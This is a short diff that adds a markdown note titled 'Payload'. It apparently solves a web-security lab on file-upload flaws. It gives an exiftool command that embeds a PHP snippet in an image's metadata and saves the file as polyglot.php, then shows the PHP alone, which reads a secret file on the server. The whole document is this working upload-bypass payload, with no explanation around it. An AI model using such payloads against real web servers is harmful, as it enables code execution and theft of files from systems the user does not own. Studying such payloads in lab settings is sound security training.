@@ -1,0 +1,10 @@
+# Payload
+```
+exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' <YOUR_IMAGE>.jpg -o polyglot.php
+```
+
+---
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
